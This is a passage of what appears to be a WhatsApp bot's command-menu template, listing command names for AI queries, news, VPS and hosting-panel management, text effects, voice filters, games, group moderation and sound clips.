│  ${khasmiring}  .ʙʟᴀᴄᴋʙᴏx <Qᴜᴇʀʏ>
│  ${khasmiring}  .ɴᴇᴠᴏ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ʟᴜᴍɪɴᴀ <Qᴜᴇʀʏ>
│  ${khasmiring}  .Teni <on/off>
│  ${khasmiring}  .ɢᴘᴛ4 <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴅɪꜰꜰᴜꜱɪᴏɴ <Qᴜᴇʀʏ>
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} M A I N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴅɪꜱᴋ
│  ${khasmiring}  .ᴘɪɴɢ
│  ${khasmiring}  .ʀᴜɴᴛɪᴍᴇ
│  ${khasmiring}  .ᴋᴏᴅᴇʙᴀʜᴀꜱᴀ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} S S N D - L I S T ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱᴀᴅ1
│  ${khasmiring}  .ꜱᴀᴅ2
│  ${khasmiring}  .ꜱᴀᴅ3
│  ${khasmiring}  .ꜱᴀᴅ4
│  ${khasmiring}  .ꜱᴀᴅ5
│  ${khasmiring}  .ꜱᴀᴅ6
│  ${khasmiring}  .ꜱᴀᴅ7
│  ${khasmiring}  .ꜱᴀᴅ8
│  ${khasmiring}  .ꜱᴀᴅ9
│  ${khasmiring}  .ꜱᴀᴅ10
│  ${khasmiring}  .ꜱᴀᴅ11
│  ${khasmiring}  .ꜱᴀᴅ12
│  ${khasmiring}  .ꜱᴀᴅ13
│  ${khasmiring}  .ꜱᴀᴅ14
│  ${khasmiring}  .ꜱᴀᴅ15
│  ${khasmiring}  .ꜱᴀᴅ16
│  ${khasmiring}  .ꜱᴀᴅ17
│  ${khasmiring}  .ꜱᴀᴅ18
│  ${khasmiring}  .ꜱᴀᴅ19
│  ${khasmiring}  .ꜱᴀᴅ20
│  ${khasmiring}  .ꜱᴀᴅ21
│  ${khasmiring}  .ꜱᴀᴅ22
│  ${khasmiring}  .ꜱᴀᴅ23
│  ${khasmiring}  .ꜱᴀᴅ24
│  ${khasmiring}  .ꜱᴀᴅ25
│  ${khasmiring}  .ꜱᴀᴅ26
│  ${khasmiring}  .ꜱᴀᴅ27
│  ${khasmiring}  .ꜱᴀᴅ28
│  ${khasmiring}  .ꜱᴀᴅ29
│  ${khasmiring}  .ꜱᴀᴅ30
│  ${khasmiring}  .ꜱᴀᴅ31
│  ${khasmiring}  .ꜱᴀᴅ32
│  ${khasmiring}  .ꜱᴀᴅ33
│  ${khasmiring}  .ꜱᴀᴅ34
│  ${khasmiring}  .ꜱᴀᴅ35
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} A B S E N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ʜᴀᴘᴜꜱᴀʙꜱᴇɴ
│  ${khasmiring}  .ᴀʙꜱᴇɴ
│  ${khasmiring}  .ᴄᴇᴋᴀʙꜱᴇɴ
│  ${khasmiring}  .ᴍᴜʟᴀɪᴀʙꜱᴇɴ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} B R T A - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜰᴀᴊᴀʀ
│  ${khasmiring}  .ᴄɴɴ
│  ${khasmiring}  .ʟᴀʏᴀʀᴋᴀᴄᴀ
│  ${khasmiring}  .ᴄɴʙᴄ
│  ${khasmiring}  .ᴛʀɪʙᴜɴ
│  ${khasmiring}  .ɪɴᴅᴏᴢᴏɴᴇ
│  ${khasmiring}  .ᴋᴏᴍᴘᴀꜱ
│  ${khasmiring}  .ᴅᴇᴛɪᴋɴᴇᴡꜱ
│  ${khasmiring}  .ᴅᴀɪʟʏɴᴇᴡꜱ
│  ${khasmiring}  .ɪɴᴇᴡꜱ
│  ${khasmiring}  .ᴏᴋᴇᴢᴏɴᴇ
│  ${khasmiring}  .ꜱɪɴᴅᴏ
│  ${khasmiring}  .ᴛᴇᴍᴘᴏ
│  ${khasmiring}  .ᴀɴᴛᴀʀᴀ
│  ${khasmiring}  .ᴋᴏɴᴛᴀɴ
│  ${khasmiring}  .ᴍᴇʀᴅᴇᴋᴀ
│  ${khasmiring}  .ᴊᴀʟᴀɴᴛɪᴋᴜꜱ-ᴍᴇᴍᴇ
│  ${khasmiring}  .ɢᴇᴍᴘᴀɴᴇᴡꜱ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} N O D E - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ʀᴇꜱᴇᴛᴘᴀꜱꜱᴡᴏʀᴅ
│  ${khasmiring}  .ᴅᴇʟᴇᴛᴇʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ʟɪꜱᴛʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ᴏɴʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ᴏꜰꜰʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ʀᴇʙᴏᴏᴛʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ʀᴇʙᴜɪʟᴅʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ꜱɪꜱᴀʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ꜱᴀʟᴅᴏʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ᴄᴇᴋᴠᴘꜱʟɪɴᴏᴅᴇ
│  ${khasmiring}  .ʟɪɴᴏᴅᴇ2ɢʙ
│  ${khasmiring}  .ʟɪɴᴏᴅᴇ4ɢʙ
│  ${khasmiring}  .ʟɪɴᴏᴅᴇ8ɢʙ
│  ${khasmiring}  .ʟɪɴᴏᴅᴇ16ɢʙ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} D O - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
│  ${khasmiring}  .ꜱᴠᴘꜱ / ꜱᴇɴᴅᴠᴘꜱ
│  ${khasmiring}  .ʟɪꜱᴛᴅʀᴏᴘʟᴇᴛ
│  ${khasmiring}  .ᴄᴇᴋᴅʀᴏᴘʟᴇᴛ
│  ${khasmiring}  .ᴛᴜʀɴᴏꜰꜰ
│  ${khasmiring}  .ᴛᴜʀɴᴏɴ
│  ${khasmiring}  .ꜱɪꜱᴀᴅʀᴏᴘʟᴇᴛ
│  ${khasmiring}  .ʀᴇʙᴜɪʟᴅ
│  ${khasmiring}  .ʀᴇꜱᴛᴀʀᴛᴠᴘꜱ
│  ${khasmiring}  .ᴠᴘꜱ1ɢ1ᴄ
│  ${khasmiring}  .ᴠᴘꜱ2ɢ1ᴄ
│  ${khasmiring}  .ᴠᴘꜱ4ɢ2ᴄ
│  ${khasmiring}  .ᴠᴘꜱ8ɢ4ᴄ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} P H O X Y - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱʜᴀᴅᴏᴡ 
│  ${khasmiring}  .ᴡʀɪᴛᴇ 
│  ${khasmiring}  .ʀᴏᴍᴀɴᴛɪᴄ 
│  ${khasmiring}  .ʙᴜʀɴᴘᴀᴘᴇʀ 
│  ${khasmiring}  .ꜱᴍᴏᴋᴇ 
│  ${khasmiring}  .ɴᴀʀᴜᴛᴏʙᴀɴɴᴇʀ 
│  ${khasmiring}  .ʟᴏᴠᴇ 
│  ${khasmiring}  .ᴜɴᴅᴇʀɢʀᴀꜱꜱ 
│  ${khasmiring}  .ᴅᴏᴜʙʟᴇʟᴏᴠᴇ 
│  ${khasmiring}  .ᴄᴏꜰꜰᴇᴄᴜᴘ 
│  ${khasmiring}  .ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴏᴄᴇᴀɴ 
│  ${khasmiring}  .ꜱᴍᴏᴋʏɴᴇᴏɴ 
│  ${khasmiring}  .ꜱᴛᴀʀꜱᴛᴇxᴛ 
│  ${khasmiring}  .ʀᴀɪɴʙᴏᴡᴇꜰꜰᴇᴄᴛ 
│  ${khasmiring}  .ʙᴀʟʟᴏᴏɴᴛᴇxᴛ 
│  ${khasmiring}  .ᴍᴇᴛᴀʟʟɪᴄᴇꜰꜰᴇᴄᴛ 
│  ${khasmiring}  .ᴇᴍʙʀᴏɪᴅᴇʀʏᴛᴇxᴛ 
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢᴛᴇxᴛ 
│  ${khasmiring}  .ꜱᴛᴏɴᴇᴛᴇxᴛ 
│  ${khasmiring}  .ᴡʀɪᴛᴇᴀʀᴛ 
│  ${khasmiring}  .ꜱᴜᴍᴍᴇʀᴛᴇxᴛ 
│  ${khasmiring}  .ᴡᴏʟꜰᴍᴇᴛᴀʟᴛᴇxᴛ 
│  ${khasmiring}  .ɴᴀᴛᴜʀᴇ3ᴅᴛᴇxᴛ 
│  ${khasmiring}  .ʀᴏꜱᴇꜱᴛᴇxᴛ 
│  ${khasmiring}  .ɴᴀᴛᴜʀᴇᴛʏᴘᴏɢʀᴀᴘʜʏ 
│  ${khasmiring}  .Qᴜᴏᴛᴇꜱᴜɴᴅᴇʀ 
│  ${khasmiring}  .ꜱʜɪɴᴇᴛᴇxᴛ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} E P H T O - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ɢʟɪᴛᴄʜᴛᴇxᴛ 
│  ${khasmiring}  .ᴡʀɪᴛᴇᴛᴇxᴛ 
│  ${khasmiring}  .ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ 
│  ${khasmiring}  .ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ 
│  ${khasmiring}  .ᴘɪxᴇʟɢʟɪᴛᴄʜ 
│  ${khasmiring}  .ɴᴇᴏɴɢʟɪᴛᴄʜ 
│  ${khasmiring}  .ꜰʟᴀɢᴛᴇxᴛ 
│  ${khasmiring}  .ꜰʟᴀɢ3ᴅᴛᴇxᴛ 
│  ${khasmiring}  .ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ 
│  ${khasmiring}  .ʙʟᴀᴄᴋᴘɪɴᴋꜱᴛʏʟᴇ 
│  ${khasmiring}  .ɢʟᴏᴡɪɴɢᴛᴇxᴛ 
│  ${khasmiring}  .ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴛᴇxᴛ 
│  ${khasmiring}  .ʟᴏɢᴏᴍᴀᴋᴇʀ 
│  ${khasmiring}  .ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ 
│  ${khasmiring}  .ᴘᴀᴘᴇʀᴄᴜᴛꜱᴛʏʟᴇ 
│  ${khasmiring}  .ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ 
│  ${khasmiring}  .ᴇꜰꜰᴇᴄᴛᴄʟᴏᴜᴅꜱ 
│  ${khasmiring}  .ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ 
│  ${khasmiring}  .ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ 
│  ${khasmiring}  .ꜱᴜᴍᴍᴇʀʙᴇᴀᴄʜ 
│  ${khasmiring}  .ʟᴜxᴜʀʏɢᴏʟᴅ 
│  ${khasmiring}  .ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ 
│  ${khasmiring}  .ꜱᴀɴᴅꜱᴜᴍᴍᴇʀ 
│  ${khasmiring}  .ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ 
│  ${khasmiring}  .1917ꜱᴛʏʟᴇ 
│  ${khasmiring}  .ᴍᴀᴋɪɴɢɴᴇᴏɴ 
│  ${khasmiring}  .ʀᴏʏᴀʟᴛᴇxᴛ 
│  ${khasmiring}  .ꜰʀᴇᴇᴄʀᴇᴀᴛᴇ 
│  ${khasmiring}  .ɢᴀʟᴀxʏꜱᴛʏʟᴇ 
│  ${khasmiring}  .ʟɪɢʜᴛᴇꜰꜰᴇᴄᴛꜱ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} V O I C E - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ʙᴀꜱꜱ
│  ${khasmiring}  .ʙʟᴏᴡɴ
│  ${khasmiring}  .ᴅᴇᴇᴘ
│  ${khasmiring}  .ᴇᴀʀʀᴀᴘᴇ
│  ${khasmiring}  .ꜰᴀꜱᴛ
│  ${khasmiring}  .ꜰᴀᴛ
│  ${khasmiring}  .ɴɪɢʜᴛᴄᴏʀᴇ
│  ${khasmiring}  .ʀᴇᴠᴇʀꜱᴇ
│  ${khasmiring}  .ʀᴏʙᴏᴛ
│  ${khasmiring}  .ꜱʟᴏᴡ
│  ${khasmiring}  .ꜱᴍᴏᴏᴛʜ
│  ${khasmiring}  .ᴛᴜᴘᴀɪ
│  ${khasmiring}  .ꜱᴍᴏᴏᴛʜ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} P N E L - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴀᴅᴅᴜꜱʀ
│  ${khasmiring}  .ᴀᴅᴅꜱʀᴠ
│  ${khasmiring}  .ᴄʀᴀᴛᴇᴀᴅᴍɪɴ
│  ${khasmiring}  .ᴅᴇʟᴜꜱʀ
│  ${khasmiring}  .ᴅᴇʟꜱʀᴠ
│  ${khasmiring}  .ᴅᴇᴛᴜꜱʀ
│  ${khasmiring}  .ʟɪꜱᴛᴀᴅᴍɪɴ
│  ${khasmiring}  .ʟɪꜱᴛᴜꜱʀ
│  ${khasmiring}  .ʟɪꜱᴛꜱʀᴠ
│  ${khasmiring}  .ʀᴇɪɴꜱᴛᴀʟʟ
│  ${khasmiring}  .ʀᴇꜱᴛᴀʀᴛꜱʀᴠ
│  ${khasmiring}  .ʀᴀᴍʟɪꜱᴛ
│  ${khasmiring}  .ꜱᴘᴀɴᴇʟ
│  ${khasmiring}  .ꜱᴛᴀʀᴛꜱʀᴠ
│  ${khasmiring}  .ꜱᴛᴏᴘꜱʀᴠ
│  ${khasmiring}  .ꜱᴜꜱᴘᴇɴᴅ
│  ${khasmiring}  .ᴜɴꜱᴜꜱᴘᴇɴᴅ 
│  ${khasmiring}  .ᴜᴘᴅᴀᴛᴇꜱʀᴠ
│  ${khasmiring}  .ᴡᴇʙᴘᴀɴᴇʟ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} G A M E - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ɢᴀᴍᴇᴛᴜᴛᴏʀ
│  ${khasmiring}  .ᴘᴇᴛᴀᴋʙᴏᴍ
│  ${khasmiring}  .ᴅᴇʟᴘᴇᴛᴀᴋʙᴏᴍ
│  ${khasmiring}  .ᴄᴀᴋʟᴏɴᴛᴏɴɢ
│  ${khasmiring}  .ᴛᴛᴄ
│  ${khasmiring}  .ᴅᴇʟᴛᴛᴄ
│  ${khasmiring}  .ꜱᴜɪᴛᴘᴠᴘ
│  ${khasmiring}  .ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
│  ${khasmiring}  .ᴛᴇʙᴀᴋᴋᴀᴛᴀ
│  ${khasmiring}  .ᴛᴇʙᴀᴋᴋᴀʟɪᴍᴀᴛ
│  ${khasmiring}  .ᴛᴇʙᴀᴋʟɪʀɪᴋ
│  ${khasmiring}  .ᴛᴇʙᴀᴋᴛᴇʙᴀᴋᴀɴ
│  ${khasmiring}  .ᴛᴇʙᴀᴋʙᴇɴᴅᴇʀᴀ
│  ${khasmiring}  .ᴛᴇʙᴀᴋᴋɪᴍɪᴀ
│  ${khasmiring}  .ᴛᴇʙᴀᴋᴀꜱᴀʜᴏᴛᴀᴋ
│  ${khasmiring}  .ᴛᴇʙᴀᴋꜱɪᴀᴘᴀᴋᴀʜᴀᴋᴜ
│  ${khasmiring}  .ᴛᴇʙᴀᴋꜱᴜꜱᴜɴᴋᴀᴛᴀ
│  ${khasmiring}  .ᴛᴇʙᴀᴋᴛᴇᴋᴀᴛᴇᴋɪ
│  ${khasmiring}  .ᴋᴜɪꜱᴍᴀᴛʜ ɴᴏᴏʙ
│  ${khasmiring}  .ᴋᴜɪꜱᴍᴀᴛʜ ᴇᴀꜱʏ
│  ${khasmiring}  .ᴋᴜɪꜱᴍᴀᴛʜ ᴍᴇᴅɪᴜᴍ
│  ${khasmiring}  .ᴋᴜɪꜱᴍᴀᴛʜ ʜᴀʀᴅ
│  ${khasmiring}  .ᴋᴜɪꜱᴍᴀᴛʜ ᴇxᴛʀᴇᴍᴇ
│  ${khasmiring}  .ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ
│  ${khasmiring}  .ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ2
╰┈────────────────•


╭┈──────────────────
│ *${m2}${khasatas1} G R U P - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴀᴅᴅ <ᴛᴀɢꜱ>
│  ${khasmiring}  .ᴋɪᴄᴋ <ᴛᴀɢꜱ>
│  ${khasmiring}  .ᴇᴠᴇʀʏᴏɴᴇ 
│  ${khasmiring}  .ᴛᴀɢᴀʟʟ
│  ${khasmiring}  .ʜɪᴅᴇᴛᴀɢ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋ  <ꜱᴇʟᴇᴄᴛ>
│  ${khasmiring}  .ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ${khasmiring}  .ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ${khasmiring}  .ᴡᴇʟᴄᴏᴍᴇ
│  ${khasmiring}  .ꜱᴇᴛᴡᴇʟᴄᴏᴍᴇ
│  ${khasmiring}  .ꜱᴇᴛɢᴏᴏᴅʙʏᴇ
│  ${khasmiring}  .ɪɴᴠɪᴛᴇ
│  ${khasmiring}  .ꜱᴇɴᴅʟɪɴᴋɢᴄ
│  ${khasmiring}  .ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ
│  ${khasmiring}  .ʟɪɴᴋɢʀᴏᴜᴘ
│  ${khasmiring}  .ᴛᴏᴛᴀɢ
│  ${khasmiring}  .ꜱᴇᴛᴘᴘɢʀᴏᴜᴘ
│  ${khasmiring}  .ᴅᴇʟ
│  ${khasmiring}  .ᴅᴇʟᴘᴘɢᴄ
│  ${khasmiring}  .ᴠᴏᴛᴇ
│  ${khasmiring}  .ᴅᴇʟᴇᴛᴇᴠᴏᴛᴇ
│  ${khasmiring}  .ᴜᴘᴠᴏᴛᴇ
│  ${khasmiring}  .ᴅᴏᴡɴᴠᴏᴛᴇ
│  ${khasmiring}  .ᴄʜᴇᴄᴋᴠᴏᴛᴇ
│  ${khasmiring}  .ᴏᴘᴇɴᴛɪᴍᴇ
│  ${khasmiring}  .ᴄʟᴏꜱᴇᴛɪᴍᴇ
│  ${khasmiring}  .ʟᴇᴀᴠᴇɢᴄ
│  ${khasmiring}  .ᴏᴘᴇɴ
│  ${khasmiring}  .ᴄʟᴏꜱᴇ
│  ${khasmiring}  .ʀᴏʟʟ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} P R V T - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴍᴇɴꜰᴇꜱꜱ
│  ${khasmiring}  .ꜱᴛᴏᴘᴄᴏɴꜰᴇꜱꜱ
│  ${khasmiring}  .ᴛᴏʟᴀᴋᴍᴇɴꜰᴇꜱꜱ
│  ${khasmiring}  .ʙᴀʟᴀꜱᴍᴇɴꜰᴇꜱꜱ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} S U N D- L I S T ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱᴏᴜɴᴅ1
│  ${khasmiring}  .ꜱᴏᴜɴᴅ2
│  ${khasmiring}  .ꜱᴏᴜɴᴅ3
│  ${khasmiring}  .ꜱᴏᴜɴᴅ4
│  ${khasmiring}  .ꜱᴏᴜɴᴅ5
│  ${khasmiring}  .ꜱᴏᴜɴᴅ6
│  ${khasmiring}  .ꜱᴏᴜɴᴅ7
│  ${khasmiring}  .ꜱᴏᴜɴᴅ8
│  ${khasmiring}  .ꜱᴏᴜɴᴅ9
│  ${khasmiring}  .ꜱᴏᴜɴᴅ10
│  ${khasmiring}  .ꜱᴏᴜɴᴅ11
│  ${khasmiring}  .ꜱᴏᴜɴᴅ12
│  ${khasmiring}  .ꜱᴏᴜɴᴅ13
│  ${khasmiring}  .ꜱᴏᴜɴᴅ14
│  ${khasmiring}  .ꜱᴏᴜɴᴅ15
│  ${khasmiring}  .ꜱᴏᴜɴᴅ16
│  ${khasmiring}  .ꜱᴏᴜɴᴅ17
│  ${khasmiring}  .ꜱᴏᴜɴᴅ18
│  ${khasmiring}  .ꜱᴏᴜɴᴅ18
│  ${khasmiring}  .ꜱᴏᴜɴᴅ20
│  ${khasmiring}  .ꜱᴏᴜɴᴅ21
│  ${khasmiring}  .ꜱᴏᴜɴᴅ22
│  ${khasmiring}  .ꜱᴏᴜɴᴅ23
│  ${khasmiring}  .ꜱᴏᴜɴᴅ24
│  ${khasmiring}  .ꜱᴏᴜɴᴅ25
│  ${khasmiring}  .ꜱᴏᴜɴᴅ26
│  ${khasmiring}  .ꜱᴏᴜɴᴅ27
│  ${khasmiring}  .ꜱᴏᴜɴᴅ28
│  ${khasmiring}  .ꜱᴏᴜɴᴅ29
│  ${khasmiring}  .ꜱᴏᴜɴᴅ30
│  ${khasmiring}  .ꜱᴏᴜɴᴅ31
│  ${khasmiring}  .ꜱᴏᴜɴᴅ32
│  ${khasmiring}  .ꜱᴏᴜɴᴅ33
│  ${khasmiring}  .ꜱᴏᴜɴᴅ34
│  ${khasmiring}  .ꜱᴏᴜɴᴅ35
│  ${khasmiring}  .ꜱᴏᴜɴᴅ36
│  ${khasmiring}  .ꜱᴏᴜɴᴅ37
│  ${khasmiring}  .ꜱᴏᴜɴᴅ38
│  ${khasmiring}  .ꜱᴏᴜɴᴅ39
│  ${khasmiring}  .ꜱᴏᴜɴᴅ40
│  ${khasmiring}  .ꜱᴏᴜɴᴅ41
│  ${khasmiring}  .ꜱᴏᴜɴᴅ42
│  ${khasmiring}  .ꜱᴏᴜɴᴅ43
│  ${khasmiring}  .ꜱᴏᴜɴᴅ44
│  ${khasmiring}  .ꜱᴏᴜɴᴅ45
│  ${khasmiring}  .ꜱᴏᴜɴᴅ46
│  ${khasmiring}  .ꜱᴏᴜɴᴅ47
│  ${khasmiring}  .ꜱᴏᴜɴᴅ48
│  ${khasmiring}  .ꜱᴏᴜɴᴅ49
│  ${khasmiring}  .ꜱᴏᴜɴᴅ50
│  ${khasmiring}  .ꜱᴏᴜɴᴅ51
│  ${khasmiring}  .ꜱᴏᴜɴᴅ52
│  ${khasmiring}  .ꜱᴏᴜɴᴅ53   
│  ${khasmiring}  .ꜱᴏᴜɴᴅ54
│  ${khasmiring}  .ꜱᴏᴜɴᴅ55
│  ${khasmiring}  .ꜱᴏᴜɴᴅ56
│  ${khasmiring}  .ꜱᴏᴜɴᴅ57
│  ${khasmiring}  .ꜱᴏᴜɴᴅ58
│  ${khasmiring}  .ꜱᴏᴜɴᴅ59
│  ${khasmiring}  .ꜱᴏᴜɴᴅ60
│  ${khasmiring}  .ꜱᴏᴜɴᴅ61
│  ${khasmiring}  .ꜱᴏᴜɴᴅ62
│  ${khasmiring}  .ꜱᴏᴜɴᴅ63
│  ${khasmiring}  .ꜱᴏᴜɴᴅ64
│  ${khasmiring}  .ꜱᴏᴜɴᴅ65
│  ${khasmiring}  .ꜱᴏᴜɴᴅ66
│  ${khasmiring}  .ꜱᴏᴜɴᴅ67
│  ${khasmiring}  .ꜱᴏᴜɴᴅ68
│  ${khasmiring}  .ꜱᴏᴜɴᴅ69
│  ${khasmiring}  .ꜱᴏᴜɴᴅ70
│  ${khasmiring}  .ꜱᴏᴜɴᴅ71
│  ${khasmiring}  .ꜱᴏᴜɴᴅ72
│  ${khasmiring}  .ꜱᴏᴜɴᴅ73
│  ${khasmiring}  .ꜱᴏᴜɴᴅ74
│  ${khasmiring}  .ꜱᴏᴜɴᴅ75
│  ${khasmiring}  .ꜱᴏᴜɴᴅ76
│  ${khasmiring}  .ꜱᴏᴜɴᴅ77
│  ${khasmiring}  .ꜱᴏᴜɴᴅ78
│  ${khasmiring}  .ꜱᴏᴜɴᴅ79
│  ${khasmiring}  .ꜱᴏᴜɴᴅ80
│  ${khasmiring}  .ꜱᴏᴜɴᴅ81
│  ${khasmiring}  .ꜱᴏᴜɴᴅ82
│  ${khasmiring}  .ꜱᴏᴜɴᴅ83
│  ${khasmiring}  .ꜱᴏᴜɴᴅ84
│  ${khasmiring}  .ꜱᴏᴜɴᴅ85
│  ${khasmiring}  .ꜱᴏᴜɴᴅ86
│  ${khasmiring}  .ꜱᴏᴜɴᴅ87
│  ${khasmiring}  .ꜱᴏᴜɴᴅ88
│  ${khasmiring}  .ꜱᴏᴜɴᴅ89
│  ${khasmiring}  .ꜱᴏᴜɴᴅ90
│  ${khasmiring}  .ꜱᴏᴜɴᴅ91
│  ${khasmiring}  .ꜱᴏᴜɴᴅ92
│  ${khasmiring}  .ꜱᴏᴜɴᴅ93
│  ${khasmiring}  .ꜱᴏᴜɴᴅ94
│  ${khasmiring}  .ꜱᴏᴜɴᴅ95
│  ${khasmiring}  .ꜱᴏᴜɴᴅ96
│  ${khasmiring}  .ꜱᴏᴜɴᴅ97
│  ${khasmiring}  .ꜱᴏᴜɴᴅ98
│  ${khasmiring}  .ꜱᴏᴜɴᴅ99
│  ${khasmiring}  .ꜱᴏᴜɴᴅ100
│  ${khasmiring}  .ꜱᴏᴜɴᴅ101
│  ${khasmiring}  .ꜱᴏᴜɴᴅ102
│  ${khasmiring}  .ꜱᴏᴜɴᴅ103
│  ${khasmiring}  .ꜱᴏᴜɴᴅ104
│  ${khasmiring}  .ꜱᴏᴜɴᴅ105
│  ${khasmiring}  .ꜱᴏᴜɴᴅ106
│  ${khasmiring}  .ꜱᴏᴜɴᴅ107
│  ${khasmiring}  .ꜱᴏᴜɴᴅ108
│  ${khasmiring}  .ꜱᴏᴜɴᴅ109
│  ${khasmiring}  .ꜱᴏᴜɴᴅ110
│  ${khasmiring}  .ꜱᴏᴜɴᴅ111
│  ${khasmiring}  .ꜱᴏᴜɴᴅ112
│  ${khasmiring}  .ꜱᴏᴜɴᴅ113
│  ${khasmiring}  .ꜱᴏᴜɴᴅ114
│  ${khasmiring}  .ꜱᴏᴜɴᴅ115
│  ${khasmiring}  .ꜱᴏᴜɴᴅ116
│  ${khasmiring}  .ꜱᴏᴜɴᴅ117
│  ${khasmiring}  .ꜱᴏᴜɴᴅ118
│  ${khasmiring}  .ꜱᴏᴜɴᴅ119
│  ${khasmiring}  .ꜱᴏᴜɴᴅ120
│  ${khasmiring}  .ꜱᴏᴜɴᴅ121
│  ${khasmiring}  .ꜱᴏᴜɴᴅ122
│  ${khasmiring}  .ꜱᴏᴜɴᴅ123
│  ${khasmiring}  .ꜱᴏᴜɴᴅ124
│  ${khasmiring}  .ꜱᴏᴜɴᴅ125
│  ${khasmiring}  .ꜱᴏᴜɴᴅ126
│  ${khasmiring}  .ꜱᴏᴜɴᴅ127
│  ${khasmiring}  .ꜱᴏᴜɴᴅ128
│  ${khasmiring}  .ꜱᴏᴜɴᴅ129
│  ${khasmiring}  .ꜱᴏᴜɴᴅ130
│  ${khasmiring}  .ꜱᴏᴜɴᴅ131
│  ${khasmiring}  .ꜱᴏᴜɴᴅ132
│  ${khasmiring}  .ꜱᴏᴜɴᴅ133
│  ${khasmiring}  .ꜱᴏᴜɴᴅ134
│  ${khasmiring}  .ꜱᴏᴜɴᴅ135
│  ${khasmiring}  .ꜱᴏᴜɴᴅ136
│  ${khasmiring}  .ꜱᴏᴜɴᴅ137
│  ${khasmiring}  .ꜱᴏᴜɴᴅ138
│  ${khasmiring}  .ꜱᴏᴜɴᴅ139
│  ${khasmiring}  .ꜱᴏᴜɴᴅ140
│  ${khasmiring}  .ꜱᴏᴜɴᴅ141
│  ${khasmiring}  .ꜱᴏᴜɴᴅ142
│  ${khasmiring}  .ꜱᴏᴜɴᴅ143
│  ${khasmiring}  .ꜱᴏᴜɴᴅ144
│  ${khasmiring}  .ꜱᴏᴜɴᴅ145
│  ${khasmiring}  .ꜱᴏᴜɴᴅ146
│  ${khasmiring}  .ꜱᴏᴜɴᴅ147
│  ${khasmiring}  .ꜱᴏᴜɴᴅ148
│  ${khasmiring}  .ꜱᴏᴜɴᴅ149
│  ${khasmiring}  .ꜱᴏᴜɴᴅ150
│  ${khasmiring}  .ꜱᴏᴜɴᴅ151
│  ${khasmiring}  .ꜱᴏᴜɴᴅ152
│  ${khasmiring}  .ꜱᴏᴜɴᴅ153
│  ${khasmiring}  .ꜱᴏᴜɴᴅ154
│  ${khasmiring}  .ꜱᴏᴜɴᴅ155
│  ${khasmiring}  .ꜱᴏᴜɴᴅ156
│  ${khasmiring}  .ꜱᴏᴜɴᴅ157
│  ${khasmiring}  .ꜱᴏᴜɴᴅ158
│  ${khasmiring}  .ꜱᴏᴜɴᴅ159
│  ${khasmiring}  .ꜱᴏᴜɴᴅ160
│  ${khasmiring}  .ꜱᴏᴜɴᴅ161
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} I S L A M - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
